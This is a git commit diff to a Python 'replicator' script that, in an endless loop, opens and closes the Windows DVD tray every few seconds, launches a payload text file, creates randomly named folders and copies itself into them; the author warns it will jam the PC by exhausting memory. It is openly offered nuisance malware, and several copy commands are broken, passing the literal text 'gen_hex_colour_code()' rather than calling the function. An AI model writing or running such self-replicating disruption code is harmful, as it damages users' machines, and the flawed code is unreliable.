90ca89cd92b4759f75532b0b1d849f0b81b41ee5
HawkHunt <cobraluuk@hotmail.com>
2016-11-24 17:57:30 +0100

    DO NOT RUN!!!!!!!!!!!! While loop modified to have the Hexa generator and folder creating in it. Program complete

--- Replicator/replicator.py
+++ Replicator/replicator.py
@@ -1,5 +1,9 @@
-#DO NOT DISTRIBUTE!
+#WARNING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+#RUNNING THIS WILL CAUSE YOUR PC TO JAM BECAUSE THIS OVERLOADS THE RAM!!!!!!!!!!!!!!!!!!!!!!!
+#CAUTION IS ADVISED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 #FOR EDUCATIONAL  PURPOSES ONLY!
+
+#Do not distribute!
 #One can make this run without the CMD window open if it is saved as a .pyw
 # a .pyw file is run with a different interpreter so there is no CMD window
 
@@ -9,7 +13,7 @@ import os
 #ctypes is needed in order to open and close the DVDdrive
 import ctypes
 #allows timers
-import 
+import time
 #allows pseudo random integers and floats
 import random
 
@@ -17,25 +21,13 @@ script = argv
 #access the last input in the command console, that is needed to clone the files
 name = str(script[0])
 
-#starts the payload text file, stored as a variable
-cmd = 'start payload.txt'
-#enters the variable into the CMD command
-os.system(cmd)
-#Makes a new new directory within the original folder called: clone
-os.mkdir('clone')
-#Runs a copy command where the Payload text file is copied to the newly made directory
-os.system(r'copy payload.txt clone')
-#Runs a copy command where the "replicator.py" is copied but it gets the name of the script from the ARGV
-#library that we imported. It gets that from the last inputted CMD command when this file was first started.
-os.system(r'copy ' + name + ' clone')
-
 #while loop to do the opening and closing of the DVDdrive.
 #everything in this loop is ran on every iteration, That includes the creation of a new waitTime integers,
 #that is done to not create a pattern where the diskdrive opens and closes regularly and is this more annoying.
-# This while loop is allways running because there are no parameters in order to not make the condition false.
+# This while loop is always running because there are no parameters in order to not make the condition false.
 while True:
-	#Creates an integer between 20 and 60 and stored as a variable.
-	waitTime = random.randint(20,60)
+	#Creates an integer between 1 and 5 and stored as a variable.
+	waitTime = random.randint(1,5)
 	# Open the DVDdrive
 	ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
 	#wait for 2 seconds
@@ -44,3 +36,22 @@ while True:
 	ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
 	#Wait for however many seconds the "random" integer happens to be in this iteration of the loop.
 	time.sleep(waitTime)
+	
+	#Hexadecimal color code creator to make sure no folders have the same name. 
+	#This Hexadecimal code is then used as a folder name and a new one is generated each loop.
+	def gen_hex_colour_code():
+		return ''.join([random.choice('0123456789ABCDEF') for x in range(6)])
+	if __name__ == '__main__':
+		print (gen_hex_colour_code())
+	
+	#starts the payload text file, stored as a variable
+	cmd = 'start payload.txt'
+	#enters the variable into the CMD command
+	os.system(cmd)
+	#Makes a new new directory within the original folder called: clone
+	os.mkdir(gen_hex_colour_code())
+	#Runs a copy command where the Payload text file is copied to the newly made directory
+	os.system(r'copy kurwa.txt' 'gen_hex_colour_code()')
+	#Runs a copy command where the "replicator.py" is copied but it gets the name of the script from the ARGV
+	#library that we imported. It gets that from the last inputted CMD command when this file was first started.
+	os.system(r'copy ' + name + 'gen_hex_colour_code()')
